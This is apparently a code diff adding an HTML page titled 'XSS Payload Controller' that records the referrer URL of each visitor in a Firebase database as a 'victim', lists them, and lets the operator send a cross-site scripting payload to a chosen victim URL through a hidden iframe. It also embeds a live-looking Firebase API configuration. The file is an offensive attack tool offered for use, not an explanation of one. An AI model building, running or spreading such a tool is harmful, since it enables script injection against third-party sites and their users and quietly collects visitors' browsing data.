@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Payload Controller</title>
+    <style>
+        body { font-family: Arial; max-width: 800px; margin: 0 auto; padding: 20px; }
+        input, textarea, button { width: 100%; padding: 10px; margin: 10px 0; }
+        button { background: #0078D7; color: white; border: none; cursor: pointer; }
+        #logs { border: 1px solid #ccc; padding: 10px; min-height: 100px; }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+</head>
+<body>
+    <h1>🔥 Detector - XSS Payload Controller</h1>
+    
+    <h3>🟢 Victims Searching for Your URL:</h3>
+    <div id="victims"></div>
+    
+    <h3>✏️ Enter XSS Payload to Send:</h3>
+    <textarea id="payload" rows="5"><svg onload=alert(document.domain)></textarea>
+    <button onclick="sendPayload()">Send Payload</button>
+    
+    <h3>📜 Logs:</h3>
+    <div id="logs"></div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCHmG5U7WmBmnz9feAVqL1cQpGOuJgjeCk",
+            authDomain: "detector-a0c06.firebaseapp.com",
+            databaseURL: "https://detector-a0c06-default-rtdb.firebaseio.com",
+            projectId: "detector-a0c06",
+            storageBucket: "detector-a0c06.appspot.com",
+            messagingSenderId: "343317057810",
+            appId: "1:343317057810:web:529c9fd0f9d963e79b63cb"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        let currentVictim = null;
+        const logs = [];
+
+        database.ref('victims').on('value', (snapshot) => {
+            const victims = snapshot.val() || {};
+            document.getElementById('victims').innerHTML = '';
+            for (const key in victims) {
+                const victimUrl = victims[key].url;
+                document.getElementById('victims').innerHTML += 
+                    `<div><strong>${victimUrl}</strong> <button onclick="selectVictim('${key}')">Select</button></div>`;
+            }
+        });
+
+        function selectVictim(key) {
+            database.ref('victims/' + key).once('value').then((snapshot) => {
+                currentVictim = snapshot.val();
+                logs.push(`✅ Selected: ${currentVictim.url}`);
+                updateLogs();
+            });
+        }
+
+        function sendPayload() {
+            if (!currentVictim) return alert("Please select a victim!");
+            const payload = document.getElementById('payload').value;
+            const encodedPayload = encodeURIComponent(payload);
+            const targetUrl = currentVictim.url.replace("https://hossamhanya.github.io/detector", encodedPayload);
+            logs.push(`🚀 Sending to: ${targetUrl}`);
+            updateLogs();
+            const iframe = document.createElement('iframe');
+            iframe.src = targetUrl;
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+        }
+
+        function updateLogs() {
+            document.getElementById('logs').innerHTML = logs.join('<br>');
+        }
+
+        const referrer = document.referrer;
+        if (referrer) {
+            database.ref('victims').push({
+                url: referrer,
+                timestamp: new Date().toISOString()
+            });
+        }
+    </script>
+</body>
+</html>
